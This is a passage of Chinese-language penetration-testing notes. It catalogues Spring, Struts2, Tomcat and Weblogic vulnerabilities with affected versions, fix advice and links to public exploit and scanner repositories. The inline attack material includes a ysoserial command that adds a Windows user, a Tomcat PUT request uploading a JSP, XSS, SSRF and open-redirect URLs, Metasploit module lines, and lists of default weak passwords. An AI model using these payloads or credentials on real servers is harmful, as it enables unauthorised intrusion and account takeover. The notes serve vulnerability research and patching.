    spring messaging 为 spring 框架提供消息支持,其上层协议是 STOMP,底层通信基于 SockJS,

    在 spring messaging 中,其允许客户端订阅消息,并使用 selector 过滤消息.selector 用 SpEL 表达式编写,并使用 StandardEvaluationContext 解析,造成命令执行漏洞.

- 影响版本
    - spring_framework < 4.2.9
    - spring_framework 4.3.0 ~ 4.3.15
    - spring_framework 5.0 ~ 5.0.5

- 文章
    - [Spring Messaging 远程命令执行漏洞 (CVE-2018-1270) ](https://vulhub.org/#/environments/spring/CVE-2018-1270/)

**CVE-2018-1273 Spring Data Commons RCE 远程命令执行漏洞**
- 简介

    Pivotal Spring Data Commons 和 Spring Data REST 都是美国 Pivotal Software 公司的产品。Pivotal Spring Data Commons 是一个为数据访问提供基于 Spring 模型的项目。Spring Data REST 是一个建立在 Spring Data 存储库之上的用于分析应用程序的域模型并公开超媒体驱动的 HTTP 资源。

    Pivotal Spring Data Commons 和 Spring Data REST 中存在安全漏洞。远程攻击者可利用该漏洞执行代码。以下产品和版本受到影响：Spring Data Commons 1.13 版本至 1.13.10 版本，2.0 版本至 2.0.5 版本及一些已不再支持的老版本；Spring Data REST 2.6 版本至 2.6.10 版本，3.0 版本至 3.0.5 版本及一些已不再支持的老版本。

- 文章
    - [Spring Data Commons 远程命令执行漏洞 (CVE-2018-1273) ](https://vulhub.org/#/environments/spring/CVE-2018-1273/)

- 影响版本
    - spring_data_commons < 1.12.10
    - spring_data_commons 1.13 ~ 1.13.10
    - spring_data_commons 2.0 ~ 2.0.5
    - spring_data_rest < 2.5.10
    - spring_data_rest 2.6 ~ 2.6.10
    - spring_data_rest 3.0 ~ 3.0.5

- POC | Payload | exp
    - [wearearima/poc-cve-2018-1273](https://github.com/wearearima/poc-cve-2018-1273)
    - [jas502n/cve-2018-1273](https://github.com/jas502n/cve-2018-1273)

---

## Struts2

> 官网 : https://struts.apache.org/

Struts2 的漏洞参考 https://cwiki.apache.org/confluence/display/WW/Security+Bulletins

**指纹**
- `Struts`
- `.action`
- `.do`
- `.action!xxxx`

**工具**
- [Lucifer1993/struts-scan](https://github.com/Lucifer1993/struts-scan) - Python2 编写的 struts2 漏洞全版本检测和利用工具
- [HatBoy/Struts2-Scan](https://github.com/HatBoy/Struts2-Scan) - Python3 Struts2 全漏洞扫描利用工具
- [shack2/Struts2VulsTools](https://github.com/shack2/Struts2VulsTools) - Struts2 系列漏洞检查工具
- [x51/STS2G](https://github.com/x51/STS2G) - Golang 版 Struts2 漏洞扫描利用工具

**环境搭建**
- [wh1t3p1g/Struts2Environment](https://github.com/wh1t3p1g/Struts2Environment) - Struts2 历史版本的漏洞环境
- [sie504/Struts-S2-xxx](https://github.com/sie504/Struts-S2-xxx) - 整理收集Struts2漏洞环境
- [shengqi158/S2-055-PoC](https://github.com/shengqi158/S2-055-PoC) - S2-055的环境，基于rest-show-case改造

**文章**
- [Struts2 历史 RCE 漏洞回顾不完全系列](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/)

**S2-016 & CVE-2013-2251**
- https://cwiki.apache.org/confluence/display/WW/S2-016

- 简介

    DefaultActionMapper 类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟 OGNL 表达式，由于 struts2 没有对这些前缀做过滤，导致利用 OGNL 表达式调用 java 静态方法执行任意系统命令

- 影响版本
    - Struts 2.0.0 ~ 2.3.15

- POC | Payload | exp
    - [OneSourceCat/s2-016-exp](https://github.com/OneSourceCat/s2-016-exp)

**S2-020 & CVE-2014-0094 & CNNVD-201403-191**
- https://cwiki.apache.org/confluence/display/WW/S2-020

- 简介

    Apache Struts 2.0.0-2.3.16 版本的默认上传机制是基于 Commons FileUpload 1.3 版本，其附加的 ParametersInterceptor 允许访问'class' 参数（该参数直接映射到 `getClass()` 方法），并允许控制 ClassLoader。在具体的 Web 容器部署环境下（如：Tomcat），攻击者利用 Web 容器下的 Java Class 对象及其属性参数（如：日志存储参数），可向服务器发起远程代码执行攻击，进而植入网站后门控制网站服务器主机。

- 影响版本
    - Struts 2.0.0 ~ 2.3.16.1

- 文章
    - [Struts2 S2-020在Tomcat 8下的命令执行分析](https://www.freebuf.com/articles/web/31039.html)

- POC | Payload | exp
    - https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Struts2/S2-020_POC.py

**S2-045 & CVE-2017-5638**
- https://cwiki.apache.org/confluence/display/WW/S2-045

- 简介

    恶意用户可在上传文件时通过修改 HTTP 请求头中的 Content-Type 值来触发该漏洞进而执行系统命令.

- 影响版本
    - Struts 2.3.5 ~ 2.3.31
    - Struts 2.5 ~ 2.5.10

- POC | Payload | exp
    - [tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
    - [iBearcat/S2-045](https://github.com/iBearcat/S2-045)

**S2-046 & CVE-2017-5638**
- https://cwiki.apache.org/confluence/display/WW/S2-046

- 简介

    该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息,导致远程攻击者可通过修改 HTTP 请求头中的 Content-Type 值,构造发送恶意的数据包,利用该漏洞进而在受影响服务器上执行任意系统命令.

- 影响版本
    - Struts 2.3.5 ~ 2.3.31
    - Struts 2.5 ~ 2.5.10

- 修复方案
    1. 官方已经发布版本更新,尽快升级到不受影响的版本(Struts 2.3.32 或 Struts 2.5.10.1),建议在升级前做好数据备份.
    2. 临时修复方案
    在用户不便进行升级的情况下,作为临时的解决方案,用户可以进行以下操作来规避风险:在 WEB-INF/classes 目录下的 struts.xml 中的 struts 标签下添加
    `<constant name="struts.custom.i18n.resources" value="global" />`
    在 WEB-INF/classes/ 目录下添加 global.properties,文件内容如下:
    `struts.messages.upload.error.InvalidContentTypeException=1`

- POC | Payload | exp
    - [mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)

**S2-048 & CVE-2017-9791**
- https://cwiki.apache.org/confluence/display/WW/S2-048

- 简介

    攻击者可以构造恶意的字段值通过 Struts2 的 struts2-struts1-plugin 插件，远程执行代码。

- 影响版本
    - Struts 2.1.x ~ 2.3.x

- POC | Payload | exp
    - [dragoneeg/Struts2-048](https://github.com/dragoneeg/Struts2-048)

**S2-052 & CVE-2017-9805**
- https://cwiki.apache.org/confluence/display/WW/S2-052

- 简介

    启用 Struts REST 插件并使用 XStream 组件对 XML 进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。

- 影响版本
    - Struts 2.1.6 ~ 2.3.33
    - Struts 2.5 ~ 2.5.12

- POC | Payload | exp
    - [mazen160/struts-pwn_CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)

**S2-053 & CVE-2017-12611**
- https://cwiki.apache.org/confluence/display/WW/S2-053

- 简介

    当开发者在 Freemarker 标签中使用如下代码时 `<@s.hidden name=”redirectUri” value=redirectUri /><@s.hidden name=”redirectUri” value=”${redirectUri}” />` Freemarker 会将值当做表达式进行执行，最后导致代码执行。

- 影响版本
    - Struts 2.0.0 ~ 2.3.33
    - Struts 2.5 ~ 2.5.10.1

- POC | Payload | exp
    - [brianwrf/S2-053-CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)

**S2-055 & CVE-2017-7525**
- https://cwiki.apache.org/confluence/display/WW/S2-055

- 简介

    2017年12月1日，Apache Struts 发布最新的安全公告，Apache Struts 2.5.x REST 插件存在远程代码执行的中危漏洞，漏洞编号与 CVE-2017-7525 相关。漏洞的成因是由于使用的 Jackson 版本过低在进行 JSON 反序列化的时候没有任何类型过滤导致远程代码执行。。

- 影响版本
    - Struts 2.5 ~ 2.5.14

- POC | Payload | exp
    - [iBearcat/S2-055](https://github.com/iBearcat/S2-055)

**S2-056 & CVE-2018-1327**
- https://cwiki.apache.org/confluence/display/WW/S2-056

- 简介

    S2-056 漏洞发生于 Apache Struts 2的 REST 插件，当使用 XStream 组件对 XML 格式的数据包进行反序列化操作，且未对数据内容进行有效验证时，攻击者可通过提交恶意 XML 数据对应用进行远程 DoS 攻击。

- 影响版本
    - Struts 2.1.1 ~ 2.5.14.1

- POC | Payload | exp
    - [ iBearcat/S2-056-XStream](https://github.com/iBearcat/S2-056-XStream)

**S2-057 & CVE-2018-11776**
- https://cwiki.apache.org/confluence/display/WW/S2-057

- 简介

    该漏洞由 Semmle Security Research team 的安全研究员 Man YueMo 发现.该漏洞是由于在 Struts2 开发框架中使用 namespace 功能定义 XML 配置时,namespace 值未被设置且在上层动作配置(Action Configuration)中未设置或用通配符 namespace,可能导致远程代码执行.

- 影响版本
    - Struts 2.0.4 ~ 2.3.34
    - Struts 2.5.0 ~ 2.5.16

- POC | Payload | exp
    - [Ivan1ee/struts2-057-exp](https://github.com/Ivan1ee/struts2-057-exp)
    - [mazen160/struts-pwn_CVE-2018-11776](https://github.com/mazen160/struts-pwn_CVE-2018-11776)

---

## Tomcat

> 官网 : https://tomcat.apache.org/

Tomcat 默认端口为 8080,也可能被改为其他端口,后台管理路径为 `/manager/html`,后台默认弱口令 admin/admin、tomcat/tomcat 等,若果配置不当,可通过"Tomcat Manager"连接部署 war 包的方式获取 webshell.

**搭建教程**
- [Tomcat 搭建](../../../../运维/Linux/Power-Linux.md#Tomcat)

**文章**
- [Tomcat漏洞详解](http://www.mottoin.com/detail/389.html)
- [渗透测试-Tomcat常见漏洞总结](https://mp.weixin.qq.com/s/ZXoCJ9GhMaTvVFeYn8vMUA)
- [Tomcat URL解析差异性导致的安全问题](https://xz.aliyun.com/t/7544)

**Tips**
- tomcat5 默认有两个角色：tomcat 和 role1。其中账号 both、tomcat、role1 的默认密码都是 tomcat。不过不具备部署应用的权限，默认需要 manager 权限才能够直接部署 war 包.
- tomcat6 默认没有配置任何用户以及角色，没办法用默认账号登录.
- tomcat7 与6类似
- tomcat8 其实从6开始，tomcat 就将默认的用户去掉了
- 控制台路径
    - `/manager/status`
    - `/manager/html`
    - `/host-manager/`

**爆破 Manager APP**

base64 编码，口令形式为 username:password

![](../../../../../assets/img/安全/笔记/RedTeam/Web安全/Web_CVE漏洞记录/2.png)

- MSF Module
    ```
    use auxiliary/scanner/http/tomcat_mgr_login
    ```

**CVE-2016-1240**
- 简介

    10月1日,Tomcat 爆出了一个本地提权漏洞。通过该漏洞,攻击者可以通过一个低权限的 Tomcat 用户获得系统的 root 权限。

- 影响版本
    - tomcat:6.0:*:*:*:*:*:*:*
    - tomcat:7.0:*:*:*:*:*:*:*
    - tomcat:8.0:*:*:*:*:*:*:*

- POC | Payload | exp
    - [Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escalation](https://www.exploit-db.com/exploits/40450/)

**CVE-2016-8735**
- 简介

    Oracle 修复了 JmxRemoteLifecycleListener 反序列化漏洞(CVE-2016-3427)。 Tomcat 也使用了 JmxRemoteLifecycleListener 这个监听器,但是 Tomcat 并没有及时升级，存在这个远程代码执行漏洞。

- 漏洞利用条件

    外部需要开启 JmxRemoteLifecycleListener 监听的 10001 和 10002 端口来实现远程代码执行。

- 影响版本
    - Tomcat 9.0.0.M1 ~ 9.0.0.M11
    - Tomcat 8.5.0 ~ 8.5.6
    - Tomcat 8.0.0.RC1 ~ 8.0.38
    - Tomcat 7.0.0 ~ 7.0.72
    - Tomcat 6.0.0 ~ 6.0.47

- 文章
    - [复现tomcat远程代码执行漏洞（CVE-2016-8735） | 回忆飘如雪](http://gv7.me/articles/2018/CVE-2016-8735/)
    - [CVE-2016-8735环境搭建到POC编写](https://blog.spoock.com/2019/09/20/cve-2016-8735/)

- POC | Payload | exp
    ```
    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.48.211 10001 Groovy1 "C:\Windows\System32\net.exe user  test 12345 /add "
    ```

**CVE-2017-12615/12616**
- 简介

    2017年9月19日,Apache Tomcat 官方确认并修复了两个高危漏洞,漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0.0-7.0.80之间,官方评级为高危,在一定条件下,攻击者可以利用这两个漏洞,获取用户服务器上 JSP 文件的源代码,或是通过精心构造的攻击请求,向用户服务器上传恶意 JSP 文件,通过上传的 JSP 文件 ,可在用户服务器上执行任意代码,从而导致数据泄露或获取服务器权限,存在高安全风险.

    - CVE-2017-12615:远程代码执行漏洞

        当 Tomcat 运行在 Windows 操作系统时,且启用了 HTTP PUT 请求方法 (例如,将 readonly 初始化参数由默认值设置为 false) ,攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件,JSP文件中的恶意代码将能被服务器执行.导致服务器上的数据泄露或获取服务器权限.

    - CVE-2017-12616:信息泄露漏洞

        当 Tomcat 中启用了 VirtualDirContext 时,攻击者将能通过发送精心构造的恶意请求,绕过设置的相关安全限制,或是获取到由 VirtualDirContext 提供支持资源服务的 JSP 源代码,从而造成代码信息泄露.

- 漏洞利用条件

    - CVE-2017-12615 漏洞利用需要在 Windows 环境,且需要将 readonly 初始化参数由默认值设置为 false,经过实际测试,Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数,需要手工添加,默认配置条件下不受此漏洞影响.

    - CVE-2017-12616 漏洞需要在 server.xml 文件配置 VirtualDirContext 参数,经过实际测试,Tomcat 7.x 版本内默认配置无 VirtualDirContext 参数,需要手工添加,默认配置条件下不受此漏洞影响.

- 影响版本

    - CVE-2017-12615 影响版本 : Apache Tomcat 7.0.0 ~ 7.0.79 (windows 环境)
    - CVE-2017-12616 影响版本 : Apache Tomcat 7.0.0 ~ 7.0.80

- 文章
    - [CVE-2017-12615/CVE-2017-12616:Tomcat信息泄漏和远程代码执行漏洞分析报告](https://paper.seebug.org/399/)

- POC | Payload | exp

    - [iBearcat/CVE-2017-12615](https://github.com/iBearcat/CVE-2017-12615)
    - [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)

    ```
    PUT /1.jsp/ HTTP/1.1
    Host: your-ip:8080
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5

    <% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>
    ```

**CVE-2017-12617**
- 简介

    运行启用了 HTTP PUT 的 Apache Tomcat 特定版本时(例如，通过将默认 servlet 的只读初始化参数设置为 false)可以通过特制请求将 JSP 文件上载到服务器。然后可以请求此 JSP，并且服务器将执行其中包含的所有代码。

- 影响版本
    - Apache Tomcat 7.0.0 ~ 7.0.81
    - Apache Tomcat 8.0.0 ~ 8.0.17

- 文章
    - [CVE-2017-12617-Tomcat远程代码执行漏洞复现测试](https://www.freebuf.com/vuls/150203.html)

- POC | Payload | exp
    - [cyberheartmi9/CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)

- MSF Module
    ```
    use exploit/multi/http/tomcat_jsp_upload_bypass
    ```

**CVE-2018-11784 Tomcat URL跳转漏洞**
- 简介

    当 Apache Tomcat 版本 9.0.0.M1 到 9.0.11、8.5.0 到 8.5.33 和 7.0.23 到 7.0.90 中的默认 servlet 返回到一个目录的重定向（例如，当用户请求'/foo'时重定向到'/foo/’），一个特制的 URL 可用于导致重定向生成到攻击者选择的任何 URI。

- 影响版本
    - Apache Tomcat 9.0.0.M1 ~ 9.0.11
    - Apache Tomcat 8.5.0 ~ 8.5.33
    - Apache Tomcat 7.0.23 ~ 7.0.90

- 相关文章
    - [Tomcat URL跳转漏洞【CVE-2018-11784】](https://mp.weixin.qq.com/s/9SFInsxPkuNcaONx8CFSaQ)

- POC | Payload | exp
    ```
    http://[ip:port]//[baidu.com]/..;/[可访问目录/可访问目录]
    ```
    默认存在的 docs 目录也可以被利用，例
    ```
    http://[ip:port]//[baidu.com]/..;/docs/images
    ```

**CVE-2019-0232**
- 简介

    该漏洞是由于 Tomcat CGI 将命令行参数传递给 Windows 程序的方式存在错误，使得 CGIServlet 被命令注入影响。

    该漏洞只影响 Windows 平台，要求启用了 CGIServlet 和 enableCmdLineArguments 参数。但是 CGIServlet 和 enableCmdLineArguments 参数默认情况下都不启用。

- 影响版本
    - Apache Tomcat 7.0.0 ~ 7.0.93
    - Apache Tomcat 8.0.0 ~ 8.5.39
    - Apache Tomcat 9.0.1 ~ 9.0.17

- 文章
    - [CVE-2019-0232:Apache Tomcat RCE漏洞分析](https://xz.aliyun.com/t/4875)
    - [复现CVE-2019-0232过程中遇到的坑 Apache Tomcat高危远程代码执行漏洞](http://www.nmd5.com/?p=375)

- POC | Payload | exp
    - [pyn3rd/CVE-2019-0232](https://github.com/pyn3rd/CVE-2019-0232)
    - [jas502n/CVE-2019-0232](https://github.com/jas502n/CVE-2019-0232)

**CVE-2020-1938 && CNVD-2020-10487 Apache Tomcat Ghostcat 漏洞**

- 概述

    Apache Tomcat 会开启 AJP 连接器,方便与其他 Web 服务器通过 AJP 协议进行交互。由于 Tomcat 本身也内含了 HTTP 服务器，因此也可以视作单独的 Web 服务器。

    但 Apache Tomcat在 AJP 协议的实现上存在漏洞,导致攻击者可以通过发送恶意的 AJP 请求,可以读取或者包含 Web 应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用 AJP 服务端口实现攻击,未开启 AJP 服务对外不受漏洞影响（tomcat 默认将 AJP 服务开启并绑定至 0.0.0.0/0）。

    此漏洞为文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件、源代码等。

- 影响版本
    - Apache Tomcat = 6
    - 7 <= Apache Tomcat < 7.0.100
    - 8 <= Apache Tomcat < 8.5.51
    - 9 <= Apache Tomcat < 9.0.31

- 文章
    - [【WEB安全】Tomcat-Ajp协议漏洞分析](https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ)
    - [如何更加精准地检测AJP协议文件包含漏洞(CVE-2020-1938)](http://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/)

- POC | Payload | exp
    - [0nise/CVE-2020-1938](https://github.com/0nise/CVE-2020-1938)
    - [YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

- 修复建议
    - 请尽快更新 Tomcat 到安全版本。
    - 临时禁用 AJP 协议端口,打开 Tomcat 配置文件 `<CATALINA_BASE>/conf/service.xml`,注释掉如下行：
        ```xml
        <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
        ```
        修改完后，重启 tomcat 即可。
    - 除以上措施外，也可采用防火墙等方法阻止不可信任的来源访问 Tomcat AJP Connector 端口。

---

## Weblogic

> 官网 : https://www.oracle.com/middleware/weblogic/

Oracle Fusion Middleware（Oracle 融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server 是其中的一个适用于云环境和传统环境的应用服务器组件。

oracle 版本号是真的乱,Weblogic 数据库版本号请看维基百科 [Oracle WebLogic Server](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)

**Tips**
- 老版本 weblogic 有一些常见的弱口令,比如 weblogic、system、portaladmin 和 guest,Oracle@123 等,用户名密码交叉使用.

**工具**
- [0xn0ne/weblogicScanner](https://github.com/0xn0ne/weblogicScanner) - weblogic 漏洞扫描工具
- [dr0op/WeblogicScan](https://github.com/dr0op/WeblogicScan) - 增强版WeblogicScan、检测结果更精确、插件化、添加CVE-2019-2618，CVE-2019-2729检测，Python3支持
- [rabbitmask/WeblogicScan](https://github.com/rabbitmask/WeblogicScan) - Weblogic 一键漏洞检测工具
- [rabbitmask/WeblogicScanLot](https://github.com/rabbitmask/WeblogicScanLot) - Weblogic 漏洞批量检测工具
- [TideSec/Decrypt_Weblogic_Password](https://github.com/TideSec/Decrypt_Weblogic_Password) - 整理了7种解密 weblogic 的方法及响应工具

**环境搭建**
- [QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment) - Weblogic 环境搭建工具

**文章**
- [利用Weblogic进行入侵的一些总结](http://drops.xmd5.com/static/drops/tips-8321.html)
- [Weblogic JRMP反序列化漏洞回顾](https://xz.aliyun.com/t/2479)
- [Oracle WebLogic RCE反序列化漏洞分析](https://www.anquanke.com/post/id/162390)
- [[漏洞预警]WebLogic T3 反序列化绕过漏洞 & 附检测POC](https://www.secfree.com/a/957.html)
- [Weblogic 常见漏洞分析](https://hellohxk.com/blog/weblogic/)

**CVE-2009-1975 xss 漏洞**
- 简介

    BEA Product Suite 10.3 中 WebLogic Server 组件中的未指定漏洞使远程攻击者可以影响与 WLS 控制台程序包相关的机密性，完整性和可用性。

- 影响版本
    - weblogic_server 10.3

- POC | Payload | exp
    - `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `
    - [Oracle WebLogic Server 10.3 - 'console-help.portal' Cross-Site Scripting](https://www.exploit-db.com/exploits/33079)

**CVE-2014-4210 SSRF**
- 文章
    - [weblogic SSRF漏洞(CVE-2014-4210)检测利用](https://blog.csdn.net/qq_29647709/article/details/84937101)

- POC | Payload | exp
    - `http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7000`

**CVE-2017-3248**
- 文章
    - [WebLogic反序列化漏洞重现江湖，CVE-2017-3248成功绕过之前的官方修复](https://paper.seebug.org/333/)

**CVE-2017-10271 XMLDecoder 反序列化漏洞**
- 简介

    Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.1.0 ~ 12.2.1.2.0

- 文章
    - [WebLogic XMLDecoder反序列化漏洞复现](https://mochazz.github.io/2017/12/25/weblogic_xmldecode/)
    - [blog-hugo/content/blog/Weblogic-0day.md](https://github.com/kylingit/blog-hugo/blob/master/content/blog/Weblogic-0day.md)

- POC | Payload | exp
    - `<目标IP:端口>/wls-wsat/CoordinatorPortType11`
    - [1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271)

**CVE-2018-2628 反序列化漏洞**
- 简介

    2018年4月18日，Oracle 官方发布了4月份的安全补丁更新 CPU（Critical Patch Update），更新中修复了一个高危的 WebLogic 反序列化漏洞 CVE-2018-2628。攻击者可以在未授权的情况下通过 T3 协议对存在漏洞的 WebLogic 组件进行远程攻击，并可获取目标系统所有权限。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.2.0 ~ 12.2.1.3

- 文章
    - [CVE-2018-2628 简单复现与分析 | xxlegend](http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)

- POC | Payload | exp
    - [shengqi158/CVE-2018-2628](https://github.com/shengqi158/CVE-2018-2628)

**CVE-2018-2893 WebLogic 反序列化漏洞**
- 简介

    Oracle 官方在2018年7月发布了关键补丁更新，其中包含了 Oracle WebLogic Server 的一个高危的 WebLogic 反序列化漏洞，通过该漏洞，攻击者可以在未授权的情况下远程执行代码。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.2.0 ~ 12.2.1.3

- 文章
    - [天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析](https://www.freebuf.com/column/178103.html)

- POC | Payload | exp
    - [pyn3rd/CVE-2018-2893](https://github.com/pyn3rd/CVE-2018-2893)

**CVE-2018-2894 未授权访问致任意文件上传/RCE 漏洞**
- 简介

    Oracle Fusion Middleware 中的 Oracle WebLogic Server 组件的 WLS - Web Services 子组件存在安全漏洞。攻击者可利用该漏洞控制 Oracle WebLogic Server，影响数据的保密性、可用性和完整性。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.2.0 ~ 12.2.1.3

- 文章
    - [Weblogic CVE-2018-2894 漏洞复现](https://blog.csdn.net/qq_23936389/article/details/81256015)

- POC | Payload | exp
    - [LandGrey/CVE-2018-2894](https://github.com/LandGrey/CVE-2018-2894)
    - [PayloadsAllTheThings/CVE Exploits/WebLogic CVE-2018-2894.py ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/WebLogic%20CVE-2018-2894.py)

**CVE-2018-3191**
- 简介

    Oracle Fusion Middleware 中的 WebLogic Server 组件 10.3.6.0 版本、12.1.3.0 版本和 12.2.1.3 版本的 WLS Core Components 子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- 文章
    - [从流量侧浅谈WebLogic远程代码执行漏洞(CVE-2018-3191)](https://www.jianshu.com/p/f73b162c4649)

- POC | Payload | exp
    - [voidfyoo/CVE-2018-3191](https://github.com/voidfyoo/CVE-2018-3191)

**CVE-2018-3245**
- 简介

    Oracle Fusion Middleware 中的 WebLogic Server 组件 10.3.6.0 版本、12.1.3.0 版本和 12.2.1.3 版本的 WLS Core Components 子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- 文章
    - [weblogic反序列化漏洞 cve-2018-3245](https://blog.51cto.com/13770310/2308371)

- POC | Payload | exp
    - [pyn3rd/CVE-2018-3245](https://github.com/pyn3rd/CVE-2018-3245)

**CVE-2018-3246**
- 简介

    Oracle Fusion Middleware 中的 WebLogic Server 组件 12.1.3.0 版本和 12.2.1.3 版本的 WLS - Web Services 子组件存在安全漏洞。攻击者可利用该漏洞未授权访问数据，影响数据的保密性。

- 影响版本
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- 文章
    - [看我如何在Weblogic里捡一个XXE (CVE-2018-3246) ](https://www.freebuf.com/vuls/186862.html)

- POC | Payload | exp
    - [hackping/XXEpayload](https://github.com/hackping/XXEpayload/tree/master/xxe)
    - `http://127.0.0.1:8338/ws_utc/begin.do`

**CVE-2018-3252**
- POC | Payload | exp
    - [pyn3rd/CVE-2018-3252](https://github.com/pyn3rd/CVE-2018-3252)

**CVE-2019-2615 任意文件读取漏洞**
- 简介

    Oracle Fusion Middleware 中的 WebLogic Server 组件 10.3.6.0.0 版本、12.1.3.0.0 版本和 12.2.1.3.0 版本的 WLS Core Components 子组件存在安全漏洞。攻击者可利用该漏洞未授权访问数据，影响数据的保密性。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- POC | Payload | exp
    - [chiaifan/CVE-2019-2615](https://github.com/chiaifan/CVE-2019-2615)

**CVE-2019-2618 Weblogic Upload Vuln(Need username password)**
- 简介

    Oracle Fusion Middleware 中的 WebLogic Server 组件 10.3.6.0.0 版本和 12.1.3.0.0 版本和 12.2.1.3.0 版本的 WLS Core Components 子组件存在安全漏洞。攻击者可利用该漏洞未授权访问、更新、插入或删除数据，影响数据的保密性和完整性。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- POC | Payload | exp
    - [jas502n/cve-2019-2618](https://github.com/jas502n/cve-2019-2618)

**CVE-2019-2725 && CNVD-C-2019-48814**
- 简介

    4月17日，国家信息安全漏洞共享平台（CNVD）公开了 Weblogic 反序列化远程代码执行漏洞（CNVD-C-2019-48814）。由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0

- 文章
    - [CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE复现](https://www.jianshu.com/p/c4982a845f55)
    - [WebLogic RCE(CVE-2019-2725)漏洞之旅](https://paper.seebug.org/909/)

- POC | Payload | exp
    ```bash
    <目标 IP:端口>/_async/AsyncResponseService
    <目标 IP:端口>/wls-wsat/CoordinatorPortType
    ```
    - [MyTools/CVE-2019-2725](https://github.com/No4l/MyTools/tree/master/CVE-2019-2725)
    - [skytina/CNVD-C-2019-48814-COMMON](https://github.com/skytina/CNVD-C-2019-48814-COMMON)
    - [lufeirider/CVE-2019-2725](https://github.com/lufeirider/CVE-2019-2725)
    - [jas502n/CNVD-C-2019-48814](https://github.com/jas502n/CNVD-C-2019-48814)
    - [black-mirror/Weblogic](https://github.com/black-mirror/Weblogic) - Weblogic CVE-2019-2725 CVE-2019-2729 Getshell 命令执行

**CVE-2019-2890 WebLogic 反序列化 RCE**
- 简介

    2019年10月16日，WebLogic 官方发布了安全补丁公告，修复了包含 CVE-2019-2890 等高危漏洞。Weblogic 在利用 T3 协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。漏洞 CVE-2019-2890 绕过了 Weblogic 的反序列化黑名单，使攻击者可以通过 T3 协议对存在漏洞的 Weblogic 组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0

- POC | Payload | exp
    - [SukaraLin/CVE-2019-2890](https://github.com/SukaraLin/CVE-2019-2890)
